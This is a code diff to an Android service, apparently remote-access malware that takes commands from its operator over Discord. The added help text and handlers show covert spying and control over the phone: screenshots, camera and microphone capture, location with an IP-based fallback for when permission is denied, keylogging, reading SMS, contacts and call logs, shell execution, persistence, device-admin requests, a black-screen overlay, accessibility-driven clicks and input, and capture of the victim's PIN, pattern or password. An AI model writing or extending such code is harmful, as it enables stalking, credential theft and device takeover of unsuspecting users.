@@ -175,10 +175,11 @@ class MainService : Service() {
                 ?: return
             if (files.isEmpty()) return
             files.sortBy { it.lastModified() }
+            // Only send the most recent crash report, delete all others
             val report = files.first().readText()
-            files.first().delete()
+            files.forEach { it.delete() }
             discord?.setCrashReport(report)
-            Log.i(TAG, "Loaded crash report: ${files.first().name}")
+            Log.i(TAG, "Loaded crash report: ${files.first().name}, deleted ${files.size - 1} old reports")
         } catch (e: Exception) {
             Log.e(TAG, "loadCrashReports: ${e.message}")
         }
@@ -193,6 +194,24 @@ class MainService : Service() {
         Log.i(TAG, "cmd: $action payload: ${payload?.take(50)}")
         try {
             when (action) {
+                "help" -> {
+                    if (payload != null && payload.isNotBlank()) {
+                        sendCommandHelp(d, payload.lowercase())
+                    } else {
+                        d.sendMsg(
+                            ":book: **Command Help**\n" +
+                            "Usage: `!help <command>`\n\n" +
+                            "**Available commands:**\n" +
+                            "`ping` `info` `status` `ip` `uptime` `debug` `restart`\n" +
+                            "`screenshot` `camera` `mic` `location` `clipboard` `keylog`\n" +
+                            "`contacts` `sms` `call_log` `wifi` `battery` `processes`\n" +
+                            "`installed` `notifications` `shell` `persist`\n" +
+                            "`admin` `overlay` `click` `input` `open` `screen`\n" +
+                            "`gesture` `pin` `torch` `vibrate`\n\n" +
+                            "Type `!help <cmd>` for usage info"
+                        )
+                    }
+                }
                 "ping" -> d.sendMsg(":green_circle: **PONG** — ${Build.MODEL} | ${Build.VERSION.RELEASE}")
                 "info" -> d.sendMsg("```ansi\n${buildInfo()}\n```")
                 "screenshot" -> {
@@ -299,12 +318,13 @@ class MainService : Service() {
                     }
                 }
                 "location" -> {
-                    if (!hasPerm(android.Manifest.permission.ACCESS_FINE_LOCATION) && !hasPerm(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
-                        d.sendMsg(":x: **Location permission denied** — reinstall and grant at setup")
-                        return
+                    if (hasPerm(android.Manifest.permission.ACCESS_FINE_LOCATION) || hasPerm(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
+                        val loc = getLocation()
+                        d.sendMsg(loc)
+                    } else {
+                        // Fallback to IP-based geolocation
+                        d.sendMsg(getIpLocation())
                     }
-                    val loc = getLocation()
-                    d.sendMsg(loc)
                 }
                 "contacts" -> {
                     if (!hasPerm(android.Manifest.permission.READ_CONTACTS)) {
@@ -475,10 +495,10 @@ class MainService : Service() {
                     }
                 }
                 "processes" -> {
-                    val procs = scanProcFs()
-                    val lines = procs.map { "${it.pid.padStart(7)} ${it.user.padEnd(12)} ${it.name}" }
-                    val out = if (lines.size > 40) lines.take(40).joinToString("\n") + "\n... (${lines.size - 40} more)" else lines.joinToString("\n")
-                    d.sendMsg(":microscope: **Processes** (${procs.size})\n```\nPID USER         NAME\n${out.take(1850)}\n```")
+                    val result = shell("ps -A 2>/dev/null || ps")
+                    val lines = result.lines().filter { it.trim().isNotEmpty() }
+                    val out = if (lines.size > 50) lines.take(50).joinToString("\n") + "\n... (${lines.size - 50} more)" else lines.joinToString("\n")
+                    d.sendMsg(":microscope: **Processes** (${lines.size})\n```\n${out.take(1900)}\n```")
                 }
                 "installed" -> {
                     val pm = packageManager
@@ -495,10 +515,26 @@ class MainService : Service() {
                         }
                         .sorted()
                     val total = apps.size
-                    val list = if (total == 0) "(no third-party apps)"
-                    else if (total > 40) apps.take(40).joinToString("\n") + "\n... (${total - 40} more)"
-                    else apps.joinToString("\n")
-                    d.sendMsg(":package: **Installed Apps** (${total})\n```\n${list.take(1900)}\n```")
+                    if (total == 0) {
+                        d.sendMsg(":package: **Installed Apps** (0)\n(no third-party apps)")
+                    } else {
+                        // Split into multiple messages if needed
+                        var msg = ""
+                        var count = 0
+                        for (app in apps) {
+                            val line = "$app\n"
+                            if (msg.length + line.length > 1900) {
+                                d.sendMsg(":package: **Installed Apps** ($total)\n```\n$msg```")
+                                delay(500)
+                                msg = ""
+                            }
+                            msg += line
+                            count++
+                        }
+                        if (msg.isNotEmpty()) {
+                            d.sendMsg(":package: **Installed Apps** ($total)\n```\n$msg```")
+                        }
+                    }
                 }
                 "torch" -> {
                     if (!hasPerm(android.Manifest.permission.CAMERA)) {
@@ -626,13 +662,20 @@ class MainService : Service() {
                     d.sendMsg(":keyboard: Input sent")
                 }
                 "open" -> {
-                    if (payload == null || payload.isBlank()) { d.sendMsg(":x: Usage: `!open com.example.app`"); return }
+                    if (payload == null || payload.isBlank()) { d.sendMsg(":x: Usage: `!open com.example.app` or `!open chrome`"); return }
                     try {
-                        val intent = packageManager.getLaunchIntentForPackage(payload)
+                        var intent = packageManager.getLaunchIntentForPackage(payload)
+                        if (intent == null) {
+                            // Try to find package by short name
+                            val foundPkg = findPackageByName(payload)
+                            if (foundPkg != null) {
+                                intent = packageManager.getLaunchIntentForPackage(foundPkg)
+                            }
+                        }
                         if (intent != null) {
                             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                             startActivitySafely(intent)
-                            d.sendMsg(":link: Opened: $payload")
+                            d.sendMsg(":link: Opened: ${intent.component?.packageName ?: payload}")
                         } else {
                             d.sendMsg(":x: Package not installed: $payload")
                         }
@@ -994,6 +1037,29 @@ class MainService : Service() {
         return ":x: No location available — ensure GPS/WiFi is on and try outside"
     }
 
+    private fun getIpLocation(): String {
+        try {
+            val url = java.net.URL("http://ip-api.com/json/")
+            val conn = url.openConnection() as java.net.HttpURLConnection
+            conn.connectTimeout = 5000
+            conn.readTimeout = 5000
+            val body = conn.inputStream.bufferedReader().readText()
+            conn.disconnect()
+            val json = org.json.JSONObject(body)
+            if (json.optString("status") == "success") {
+                val lat = json.getDouble("lat")
+                val lon = json.getDouble("lon")
+                val city = json.optString("city", "?")
+                val country = json.optString("country", "?")
+                val ip = json.optString("query", "?")
+                return ":round_pushpin: **Location** (IP-based)\nLat: `$lat`\nLon: `$lon`\nCity: $city, $country\nIP: $ip\nhttps://www.google.com/maps?q=$lat,$lon"
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "ipLocation: ${e.message}")
+        }
+        return ":x: No location available — ensure GPS/WiFi is on and try outside"
+    }
+
     private fun queryText(uri: Uri, cols: Array<String>, transform: (Cursor) -> String): String {
         return try {
             val cursor = contentResolver.query(uri, cols, null, null, "date DESC")
@@ -1097,6 +1163,104 @@ class MainService : Service() {
         } catch (e: Exception) {
             "Error: ${e.message}"
         }
+    }
+
+    private fun findPackageByName(name: String): String? {
+        val search = name.lowercase().replace(" ", "")
+        val commonApps = mapOf(
+            "chrome" to "com.android.chrome",
+            "browser" to "com.android.browser",
+            "settings" to "com.android.settings",
+            "camera" to "com.android.camera2",
+            "gallery" to "com.google.android.gallery3d",
+            "photos" to "com.google.android.apps.photos",
+            "maps" to "com.google.android.apps.maps",
+            "youtube" to "com.google.android.youtube",
+            "whatsapp" to "com.whatsapp",
+            "telegram" to "org.telegram.messenger",
+            "signal" to "org.thoughtcrime.securesms",
+            "facebook" to "com.facebook.katana",
+            "instagram" to "com.instagram.android",
+            "twitter" to "com.twitter.android",
+            "tiktok" to "com.zhiliaoapp.musically",
+            "snapchat" to "com.snapchat.android",
+            "gmail" to "com.google.android.gm",
+            "messages" to "com.google.android.apps.messaging",
+            "phone" to "com.google.android.dialer",
+            "calendar" to "com.google.android.calendar",
+            "drive" to "com.google.android.apps.docs",
+            "playstore" to "com.android.vending",
+            "play" to "com.android.vending",
+            "store" to "com.android.vending",
+            "files" to "com.google.android.documentsui",
+            "calculator" to "com.android.calculator2",
+            "clock" to "com.google.android.deskclock",
+            "contacts" to "com.google.android.contacts",
+            "spotify" to "com.spotify.music",
+            "netflix" to "com.netflix.mediaclient",
+            "discord" to "com.discord",
+            "reddit" to "com.reddit.frontpage",
+            "tiktok" to "com.zhiliaoapp.musically",
+        )
+        // Direct match
+        commonApps[search]?.let { return it }
+        // Fuzzy match
+        for ((key, pkg) in commonApps) {
+            if (key.contains(search) || search.contains(key)) return pkg
+        }
+        // Search installed packages
+        val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+            PackageManager.ApplicationInfoFlags.of(0L) else 0
+        @Suppress("DEPRECATION")
+        val apps = packageManager.getInstalledApplications(flags as? Int ?: 0)
+        for (app in apps) {
+            val label = app.loadLabel(packageManager).toString().lowercase().replace(" ", "")
+            val pkgName = app.packageName.lowercase()
+            if (label.contains(search) || pkgName.contains(search)) {
+                return app.packageName
+            }
+        }
+        return null
+    }
+
+    private fun sendCommandHelp(d: DiscordGatewayClient, cmd: String) {
+        val help = when (cmd) {
+            "ping" -> ":green_circle: **!ping**\nCheck if device is online.\nUsage: `!ping`"
+            "info" -> ":information_source: **!info**\nShow device information.\nUsage: `!info`"
+            "status" -> ":bar_chart: **!status**\nShow connection and system status.\nUsage: `!status`"
+            "ip" -> ":globe_with_meridians: **!ip**\nShow public IP address.\nUsage: `!ip`"
+            "uptime" -> ":clock1: **!uptime**\nShow how long device has been connected.\nUsage: `!uptime`"
+            "debug" -> ":mag: **!debug**\nShow recent debug log.\nUsage: `!debug`"
+            "restart" -> ":arrows_counterclockwise: **!restart**\nRestart the Discord gateway connection.\nUsage: `!restart`"
+            "screenshot" -> ":camera: **!screenshot**\nCapture device screen.\nUsage: `!screenshot`\nRequires: Android 14+ with Accessibility enabled"
+            "camera" -> ":camera_flash: **!camera**\nTake photo with device camera.\nUsage: `!camera` (back camera)\nUsage: `!camera front` (front camera)"
+            "mic" -> ":microphone: **!mic**\nRecord audio from microphone.\nUsage: `!mic` (10 seconds)\nUsage: `!mic 30` (30 seconds, max 60)"
+            "location" -> ":round_pushpin: **!location**\nGet device GPS location.\nUsage: `!location`\nFalls back to IP-based if GPS unavailable"
+            "clipboard" -> ":clipboard: **!clipboard**\nRead current clipboard content.\nUsage: `!clipboard`"
+            "keylog" -> ":keyboard: **!keylog**\nView captured keystrokes.\nUsage: `!keylog` (view)\nUsage: `!keylog on` (enable)\nUsage: `!keylog off` (disable)"
+            "contacts" -> ":busts_in_silhouette: **!contacts**\nList device contacts.\nUsage: `!contacts`"
+            "sms" -> ":envelope: **!sms**\nRead SMS inbox.\nUsage: `!sms`"
+            "call_log" -> ":telephone_receiver: **!call_log**\nRead call history.\nUsage: `!call_log`"
+            "wifi" -> ":wifi: **!wifi**\nShow current WiFi network info.\nUsage: `!wifi`"
+            "battery" -> ":battery: **!battery**\nShow battery status.\nUsage: `!battery`"
+            "processes" -> ":microscope: **!processes**\nList running processes.\nUsage: `!processes`"
+            "installed" -> ":package: **!installed**\nList all installed apps.\nUsage: `!installed`"
+            "notifications" -> ":bell: **!notifications**\nShow recent notifications.\nUsage: `!notifications`\nRequires: Notification Listener access"
+            "shell" -> ":terminal: **!shell**\nExecute shell command.\nUsage: `!shell <command>`\nExample: `!shell whoami`"
+            "persist" -> ":syringe: **!persist**\nInstall persistence mechanism.\nUsage: `!persist`"
+            "admin" -> ":shield: **!admin**\nRequest device admin privileges.\nUsage: `!admin`"
+            "overlay" -> ":black_large_square: **!overlay**\nToggle black screen overlay.\nUsage: `!overlay` (on)\nUsage: `!overlay off`"
+            "click" -> ":point_up: **!click**\nClick by text or coordinates.\nUsage: `!click <text>`\nUsage: `!click x,y`"
+            "input" -> ":keyboard: **!input**\nType text via accessibility.\nUsage: `!input <text>`"
+            "open" -> ":link: **!open**\nLaunch an app.\nUsage: `!open com.example.app`\nUsage: `!open chrome` (short name)"
+            "screen" -> ":frame_photo: **!screen**\nDump current UI tree.\nUsage: `!screen`"
+            "gesture" -> ":hand: **!gesture**\nPerform swipe gesture.\nUsage: `!gesture x1,y1,x2,y2,ms`"
+            "pin" -> ":lock: **!pin**\nView captured PIN/pattern/password.\nUsage: `!pin`"
+            "torch" -> ":flashlight: **!torch**\nToggle flashlight.\nUsage: `!torch` (on)\nUsage: `!torch off`"
+            "vibrate" -> ":vibration_mode: **!vibrate**\nVibrate device.\nUsage: `!vibrate` (1 second)\nUsage: `!vibrate 3000` (3 seconds)"
+            else -> ":x: Unknown command: `!$cmd`\nType `!help` for available commands."
+        }
+        d.sendMsg(help)
     }
 
     private fun persistApk() {
